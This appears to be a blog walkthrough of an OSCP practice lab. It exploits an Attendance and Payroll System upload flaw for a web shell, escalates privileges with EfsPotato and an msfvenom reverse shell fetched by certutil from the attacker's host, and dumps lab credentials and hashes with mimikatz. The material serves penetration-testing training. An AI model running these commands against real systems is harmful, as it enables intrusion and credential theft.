---
title: OSCP A
date: 2026-01-07
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
  - Web-SourceCode-DataLeak
  - CVE-2021-44087
  - Lateral-Movement-mimikatz
  - Windows-Privilege-Escalation-windows-Files
  - CVE-2020-13151
  - Linux-Privilege-Escalation-link-Injection
  - web-github-abuse
  - Linux-Privilege-Escalation-backupfile
  - Windows-Privilege-Escalation-Putty
  - offsec
  - Nmap
  - Windows-Privilege-Escalation-SeImpersonatePrivilege
  - nmap
lastmod: 2026-04-03T12:17:00.265Z
---
# Box Info

This lab involves a sophisticated attack chain against an Active Directory environment. Learners begin by exploiting a vulnerable webapp to achieve remote code execution, followed by privilege escalation Privilege abuse. Through lateral movement, pivoting across network segments, and cracking Kerberos tickets, learners must enumerate and compromise domain assets to achieve full domain control.

{{< code >}}\
10.10.188.140

Challenge 4 - DC01 OS Credentials:

No credentials were provided for this machine

192.168.228.141

Challenge 4 - MS01 OS Credentials:

Eric.Wallows / EricLikesRunning800

10.10.188.142

Challenge 4 - MS02 OS Credentials:

No credentials were provided for this machine

192.168.228.143

Challenge 4 - Aero OS Credentials:

No credentials were provided for this machine

192.168.228.144

Challenge 4 - Crystal OS Credentials:

No credentials were provided for this machine

192.168.228.145

Challenge 4 - Hermes OS Credentials:

No credentials were provided for\
{{< /code >}}

# Recon 192.168.X.141

### Nmap

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap" >}} Start of nmap, showing web nicepage.com , Attendance and Payroll System, Not Found page ,mysql database(unauthorized),SMB

{{< /toggle >}}

```shell
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.208.141 -oN serviceScan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 14:19 HKT
WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
Nmap scan report for 192.168.208.141
Host is up (0.040s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    closed ftp
22/tcp    open   ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp    open   http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.8.2, nicepage.com
|_http-title: Home
81/tcp    open   http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Attendance and Payroll System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   closed https
445/tcp   open   microsoft-ds?
1978/tcp  closed unisql
3000/tcp  closed ppp
3001/tcp  closed nessus
3003/tcp  closed cgms
3306/tcp  open   mysql         MySQL (unauthorized)
3307/tcp  open   mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  closed ms-wbt-server
5040/tcp  open   unknown
5432/tcp  closed postgresql
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   msrpc         Microsoft Windows RPC
51775/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Web Reco 81

{{< toggle "Tag 🏷️" >}}

{{< tag "Web-Attack" >}} Discovering CVE-50801 in tech stack title, which will abuse the /apsystem/admin/employee\_edit\_photo.php to upload php revshell  in the /apsystem/images/shell.php to have RCE

{{< /toggle >}}

![Pasted image 20251215151425.png](/ob/Pasted%20image%2020251215151425.png)

Used the `whatweb` to identify the tech stack is used Attendence and Payroll system  https://www.exploit-db.com/exploits/50801

```shell
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
─# python3 50801.py  http://192.168.208.141:81                

    >> Attendance and Payroll System v1.0
    >> Unauthenticated Remote Code Execution
    >> By pr0z

[*] Uploading the web shell to http://192.168.208.141:81
[*] Validating the shell has been uploaded to http://192.168.208.141:81
[✓] Successfully connected to web shell

```

Attendence and Payroll system can be abused by this [exploit](https://www.exploit-db.com/exploits/50801) which  abuse the /apsystem/admin/employee\_edit\_photo.php to upload php revshell  in the /apsystem/images/shell.php to have RCE

### mary.williams to admin(SeImpersonatePrivilege)

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-SeImpersonatePrivilege" >}} Checking for SeImpersonatePrivilege Token by whoami then doing EfsPotato.cs exploit

{{< /toggle >}}

![Pasted image 20251215152042.png](/ob/Pasted%20image%2020251215152042.png)

```shell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe C:\ProgramData\EfsPotato.cs -nowarn:1691,618
dir  C:\ProgramData\
EfsPotato.exe whoami


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.204 LPORT=80  -f exe -o reverse.exe
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.204
set LPORT 80
exploit
certutil -urlcache -split -f http://192.168.45.204:8081/reverse.exe C:\ProgramData\reverse.exe
EfsPotato.exe "C:\ProgramData\reverse.exe" netlogon
```

![Pasted image 20251215153115.png](/ob/Pasted%20image%2020251215153115.png)

{{< toggle "Tag 🏷️" >}}

{{< tag " Lateral-Movement-mimikatz" >}} Using mimikatz to find the new user 's NTLM ,holding the Mary.Williams to find the new user of celia.almeda ,then evil-winrm with hash to the new user.

{{< /toggle >}}

{{< mindmap >}}

# Lateral-Movement mimikatz usage

* privilege::debug
* sekurlsa::logonpasswords
* sekurlsa::credman
* lsadump::secrets

# sekurlsa::logonpasswords

* NTLM
  * evil-winrm

{{< /mindmap >}}

Using mimikatz to find the new user 's NTLM,

```shell
C:\mimikatz_trunk\x64>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

Authentication Id : 0 ; 399853 (00000000:000619ed)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 2/12/2025 4:45:52 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
	credman :	

Authentication Id : 0 ; 136564 (00000000:00021574)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	credman :	

Authentication Id : 0 ; 135819 (00000000:0002128b)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	credman :	

Authentication Id : 0 ; 134785 (00000000:00020e81)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	credman :	

Authentication Id : 0 ; 85333 (00000000:00014d55)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	credman :	

Authentication Id : 0 ; 85162 (00000000:00014caa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-19
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-20
	credman :	

Authentication Id : 0 ; 48838 (00000000:0000bec6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-1
	credman :	

Authentication Id : 0 ; 48788 (00000000:0000be94)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-0
	credman :	

Authentication Id : 0 ; 46923 (00000000:0000b74b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : 
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-18
	credman :	

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 399853 (00000000:000619ed)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 2/12/2025 4:45:52 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
	msv :	
	 [00000003] Primary
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
	 * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
	 * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
	tspkg :	
	wdigest :	
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : celia.almeda
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 136564 (00000000:00021574)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	msv :	
	 [00000003] Primary
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
	 * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
	tspkg :	
	wdigest :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 135819 (00000000:0002128b)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	msv :	
	 [00000003] Primary
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
	 * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
	tspkg :	
	wdigest :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 134785 (00000000:00020e81)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	msv :	
	 [00000003] Primary
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
	 * SHA1     : 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
	tspkg :	
	wdigest :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Mary.Williams
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 85333 (00000000:00014d55)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : 0d94b937ef3562f185262da2d6494e65
	 * SHA1     : 6782e7eea6300acc3ee78b8482ed39ce3834ae05
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 8b 01 33 23 1b f7 2a 1a 2d 04 c7 f3 6c 19 9a 18 75 aa 83 20 c5 ca 3a 47 93 e9 f6 df 9b 69 9f f0 78 5d ab 0a c0 c3 a6 27 e4 8f 5d 53 5e ef 0d 96 53 58 22 52 12 5c 43 f3 a7 c3 e3 86 3f b7 1d de 06 2e 29 e2 08 f8 d0 c2 f4 a7 bc 27 50 eb d1 58 68 b2 80 8c 45 55 fe 15 78 66 13 73 92 73 9e cb 18 2e c2 4d a3 2c 2e ef 2c 14 05 4f e4 a6 5b 0b a2 58 78 0e a0 6b a1 6c b9 89 af 6e 88 15 c5 a6 23 76 a4 08 4e 01 47 3d 1a f1 d0 89 89 b9 4e 8f b1 91 2a f9 8c e1 de d4 45 2e 92 9a d5 71 bc d1 e4 2b 51 34 bc bc cf 7f 71 1e 29 5a 79 af 48 9c a7 d6 40 26 f5 67 cf f4 56 02 32 88 47 76 4d a1 b3 62 c7 71 45 36 71 44 68 3a c2 09 7a f6 3e a7 d2 df 15 8f 24 fe b0 d0 f1 f0 d3 47 d5 36 ef 3d b8 d1 94 3e 09 e9 e2 1e 1a 48 aa c6 c4 30 52 2b 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 85162 (00000000:00014caa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 48838 (00000000:0000bec6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 48788 (00000000:0000be94)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 46923 (00000000:0000b74b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : b02e48113ff3f815685ca7b8b35929c4
	 * SHA1     : 1e25487267ada9341bad8e06823fcf0fb66d3022
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
	ssp :	
	credman :	
	cloudap :	

mimikatz # lsadump::secrets
Domain : MS01
SysKey : a5403534b0978445a2df2d30d19a7980

Local name : MS01 ( S-1-5-21-2114389728-3978811169-1968162427 )
Domain name : OSCP ( S-1-5-21-2610934713-1581164095-2706428072 )
Domain FQDN : oscp.exam

Policy subsystem is : 1.18
LSA Key(s) : 1, default {51d601d1-119c-163a-7318-7f9426349648}
  [00] {51d601d1-119c-163a-7318-7f9426349648} 6a730b82a6aa37201014830f2e68216ab15f2bce391265ff3d4fdd22d9e86549

Secret  : $MACHINE.ACC
cur/hex : 7d 3b c2 35 4f 88 a6 06 6e ed 35 af 30 17 a4 29 3f 04 27 0f 05 2c e1 60 fb 86 48 71 55 96 22 ee 25 64 16 0d 5e 68 2d 8e 56 b6 67 66 96 87 d5 6c 24 9c 4d eb 54 ac 5c c9 2f 5a 42 bf a6 10 d0 c5 7a a4 30 7d 3a 3c ab d4 2d fc d9 f3 90 ac a8 76 0a 75 8a 4d 84 cc b2 81 e1 62 a7 11 19 e7 ac b5 1a 8a a7 ef b5 04 c2 2a 3e 44 2f e2 91 a8 12 e6 9b 7e 94 78 59 0f 88 3f 34 e8 01 aa ca fb 04 75 94 cf 24 35 dc 37 25 35 4c 5f 5e bb 6c 52 5d 04 4d af e1 11 96 1d ca 7a eb 54 b1 2d 03 dd 86 c8 f8 92 84 66 d7 53 cb 24 e3 23 15 46 0b 7c 54 c9 c5 0c a9 14 16 e7 15 ee d5 99 a3 c7 a7 5d 9f 76 68 45 12 2f b3 b4 a1 92 5f f3 db 80 da b2 f0 d3 96 cb 65 5d 2e 48 dc e5 0c 39 a5 b2 94 31 fa 31 4e f3 92 e3 98 73 73 05 e7 29 46 3c 57 67 b8 26 
    NTLM:b02e48113ff3f815685ca7b8b35929c4
    SHA1:1e25487267ada9341bad8e06823fcf0fb66d3022
old/hex : 8b 01 33 23 1b f7 2a 1a 2d 04 c7 f3 6c 19 9a 18 75 aa 83 20 c5 ca 3a 47 93 e9 f6 df 9b 69 9f f0 78 5d ab 0a c0 c3 a6 27 e4 8f 5d 53 5e ef 0d 96 53 58 22 52 12 5c 43 f3 a7 c3 e3 86 3f b7 1d de 06 2e 29 e2 08 f8 d0 c2 f4 a7 bc 27 50 eb d1 58 68 b2 80 8c 45 55 fe 15 78 66 13 73 92 73 9e cb 18 2e c2 4d a3 2c 2e ef 2c 14 05 4f e4 a6 5b 0b a2 58 78 0e a0 6b a1 6c b9 89 af 6e 88 15 c5 a6 23 76 a4 08 4e 01 47 3d 1a f1 d0 89 89 b9 4e 8f b1 91 2a f9 8c e1 de d4 45 2e 92 9a d5 71 bc d1 e4 2b 51 34 bc bc cf 7f 71 1e 29 5a 79 af 48 9c a7 d6 40 26 f5 67 cf f4 56 02 32 88 47 76 4d a1 b3 62 c7 71 45 36 71 44 68 3a c2 09 7a f6 3e a7 d2 df 15 8f 24 fe b0 d0 f1 f0 d3 47 d5 36 ef 3d b8 d1 94 3e 09 e9 e2 1e 1a 48 aa c6 c4 30 52 2b 
    NTLM:0d94b937ef3562f185262da2d6494e65
    SHA1:6782e7eea6300acc3ee78b8482ed39ce3834ae05

Secret  : DefaultPassword
cur/text: 7k8XHk3dMtmpnC7

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 14 cc 9a cc bb 06 d4 af 8f 07 29 57 49 93 3b 06 cf 0d 6d fd 4c 31 eb 80 2e 35 29 d3 4f 19 8a 04 73 a6 74 5c f5 94 85 27 
    full: 14cc9accbb06d4af8f07295749933b06cf0d6dfd4c31eb802e3529d34f198a0473a6745cf5948527
    m/u : 14cc9accbb06d4af8f07295749933b06cf0d6dfd / 4c31eb802e3529d34f198a0473a6745cf5948527
old/hex : 01 00 00 00 00 21 20 4a 5d 28 d3 d0 74 90 83 dc 62 ca af 56 49 25 54 cb 72 72 c0 ec 42 6e 4a ca 5e af 59 a9 7c 48 20 25 d6 1d 0e b7 
    full: 0021204a5d28d3d0749083dc62caaf56492554cb7272c0ec426e4aca5eaf59a97c482025d61d0eb7
    m/u : 0021204a5d28d3d0749083dc62caaf56492554cb / 7272c0ec426e4aca5eaf59a97c482025d61d0eb7

Secret  : NL$KM
cur/hex : f1 9f 8d 0a 3d 6b 2d 13 69 96 2e 4c 32 4d c3 66 d5 36 97 ab 1f 0b f2 38 11 3e df 05 ae df 31 70 c0 e3 97 a0 08 31 a9 2a e3 88 48 dd 2c 88 86 56 83 c9 79 90 03 d5 9d 28 c1 be 33 d6 0e 7b b7 9b 
old/hex : f1 9f 8d 0a 3d 6b 2d 13 69 96 2e 4c 32 4d c3 66 d5 36 97 ab 1f 0b f2 38 11 3e df 05 ae df 31 70 c0 e3 97 a0 08 31 a9 2a e3 88 48 dd 2c 88 86 56 83 c9 79 90 03 d5 9d 28 c1 be 33 d6 0e 7b b7 9b 

Secret  : _SC_wampapache64 / service 'wampapache64' with username : .\Mary.Williams
